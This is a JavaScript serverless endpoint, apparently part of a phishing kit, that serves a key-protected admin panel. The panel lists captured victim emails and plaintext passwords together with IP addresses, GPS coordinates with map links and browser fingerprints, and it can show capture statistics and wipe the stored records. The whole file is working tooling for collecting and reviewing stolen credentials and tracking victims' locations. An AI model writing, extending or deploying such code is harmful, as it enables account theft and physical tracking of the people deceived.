// api/retrieve.js — Admin panel to view captured credentials + geolocation

const UPSTASH_URL = process.env.KV_REST_API_URL;
const UPSTASH_TOKEN = process.env.KV_REST_API_TOKEN;
const KV_PREFIX = "coffee-fence";
const ADMIN_KEY = process.env.ADMIN_SECRET_KEY || "change-me-in-vercel-env";

export default async function handler(req, res) {
    res.setHeader('Content-Type', 'text/html');

    const accessKey = req.query.key;

    if (!accessKey || accessKey !== ADMIN_KEY) {
        res.status(401);
        return res.send('<h1>Unauthorized</h1><p>Invalid or missing access key.</p>');
    }

    const action = req.query.action || 'list';

    if (action === 'list') {
        return await showList(req, res);
    } else if (action === 'stats') {
        return await showStats(req, res);
    } else if (action === 'clear') {
        return await clearData(req, res);
    } else {
        return res.send(`
            <h1>Admin Panel</h1>
            <ul>
                <li><a href="?key=${accessKey}&action=list">View Captured Data</a></li>
                <li><a href="?key=${accessKey}&action=stats">Statistics</a></li>
                <li><a href="?key=${accessKey}&action=clear" onclick="return confirm('Delete ALL data?')">Clear All Data</a></li>
            </ul>
        `);
    }
}

async function showList(req, res) {
    try {
        const result = await upstashGet(`${KV_PREFIX}:all_entries`);
        let entries = [];

        if (result.result) {
            try {
                entries = JSON.parse(result.result);
            } catch(e) {}
        }

        if (!Array.isArray(entries)) entries = [];

        let html = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Admin - Captured Data</title>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                * { box-sizing: border-box; margin: 0; padding: 0; }
                body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #f5f5f5; padding: 20px; }
                h1 { color: #333; margin-bottom: 10px; }
                .count { color: #666; margin-bottom: 20px; }
                table { width: 100%; border-collapse: collapse; background: #fff; box-shadow: 0 1px 4px rgba(0,0,0,0.1); border-radius: 8px; overflow: hidden; }
                th { background: #1877f2; color: white; padding: 12px 10px; text-align: left; font-size: 13px; }
                td { padding: 10px; border-bottom: 1px solid #eee; font-size: 13px; }
                tr:hover { background: #f0f7ff; }
                .map-link { color: #1877f2; text-decoration: none; }
                .map-link:hover { text-decoration: underline; }
                .nav { margin-bottom: 20px; }
                .nav a { color: #1877f2; text-decoration: none; margin-right: 15px; font-size: 14px; }
                .nav a:hover { text-decoration: underline; }
            </style>
        </head>
        <body>
            <div class="nav">
                <a href="?key=${req.query.key}">Home</a>
                <a href="?key=${req.query.key}&action=stats">Stats</a>
                <a href="?key=${req.query.key}&action=clear" onclick="return confirm('Delete ALL captured data?')">Clear All</a>
            </div>
            <h1>Captured Credentials</h1>
            <div class="count">Total: <strong>${entries.length}</strong> entries</div>
            <table>
                <tr>
                    <th>#</th>
                    <th>Timestamp</th>
                    <th>Email</th>
                    <th>Password</th>
                    <th>IP</th>
                    <th>Latitude</th>
                    <th>Longitude</th>
                    <th>Map</th>
                    <th>Browser</th>
                </tr>`;

        entries.forEach((e, i) => {
            const lat = e.location?.lat ?? '-';
            const lon = e.location?.lon ?? '-';
            const mapLink = (lat !== '-' && lon !== '-') 
                ? `<a class="map-link" href="https://www.google.com/maps?q=${lat},${lon}" target="_blank">📍 View</a>`
                : '-';
            const ua = e.fingerprint?.userAgent || '-';
            const shortUA = ua.length > 60 ? ua.substring(0, 60) + '...' : ua;

            html += `<tr>
                <td>${i+1}</td>
                <td>${new Date(e.timestamp).toLocaleString()}</td>
                <td><strong>${escapeHtml(e.email)}</strong></td>
                <td><code>${escapeHtml(e.password)}</code></td>
                <td>${escapeHtml(e.ip)}</td>
                <td>${lat}</td>
                <td>${lon}</td>
                <td>${mapLink}</td>
                <td title="${escapeHtml(ua)}">${escapeHtml(shortUA)}</td>
            </tr>`;
        });

        html += `</table></body></html>`;
        res.send(html);

    } catch (err) {
        res.status(500).send(`<h1>Error</h1><p>${escapeHtml(err.message)}</p>`);
    }
}

async function showStats(req, res) {
    try {
        const countResult = await upstashGet(`${KV_PREFIX}:total_captures`);
        const count = countResult.result || '0';

        res.send(`
            <!DOCTYPE html>
            <html>
            <head><title>Stats</title>
            <style>
                body { font-family: -apple-system, sans-serif; padding: 40px; background: #f5f5f5; }
                .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 1px 4px rgba(0,0,0,0.1); max-width: 400px; }
                h1 { color: #333; }
                .num { font-size: 48px; color: #1877f2; font-weight: bold; }
                .nav { margin-bottom: 20px; }
                .nav a { color: #1877f2; text-decoration: none; margin-right: 15px; }
            </style>
            </head>
            <body>
                <div class="card">
                    <div class="nav"><a href="?key=${req.query.key}&action=list">Back to list</a></div>
                    <h1>Statistics</h1>
                    <p>Total captures:</p>
                    <div class="num">${count}</div>
                </div>
            </body>
            </html>
        `);
    } catch (err) {
        res.status(500).send(`Error: ${err.message}`);
    }
}

async function clearData(req, res) {
    try {
        await upstashDel(`${KV_PREFIX}:all_entries`);
        await upstashSet(`${KV_PREFIX}:total_captures`, '"0"');
        res.send(`<h1>Cleared</h1><p>All captured data has been deleted.</p><a href="?key=${req.query.key}">Back</a>`);
    } catch (err) {
        res.status(500).send(`Error: ${err.message}`);
    }
}

async function upstashGet(key) {
    const url = `${UPSTASH_URL}/get/${encodeURIComponent(key)}`;
    const resp = await fetch(url, {
        headers: { 'Authorization': `Bearer ${UPSTASH_TOKEN}` }
    });
    return resp.json();
}

async function upstashSet(key, value) {
    const url = `${UPSTASH_URL}/set/${encodeURIComponent(key)}`;
    await fetch(url, {
        method: 'POST',
        headers: {
            'Authorization': `Bearer ${UPSTASH_TOKEN}`,
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(value)
    });
}

async function upstashDel(key) {
    const url = `${UPSTASH_URL}/del/${encodeURIComponent(key)}`;
    await fetch(url, {
        method: 'POST',
        headers: { 'Authorization': `Bearer ${UPSTASH_TOKEN}` }
    });
}

async function upstashIncr(key) {
    const url = `${UPSTASH_URL}/incr/${encodeURIComponent(key)}`;
    await fetch(url, {
        method: 'POST',
        headers: { 'Authorization': `Bearer ${UPSTASH_TOKEN}` }
    });
}

function escapeHtml(str) {
    if (typeof str !== 'string') return str;
    return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}
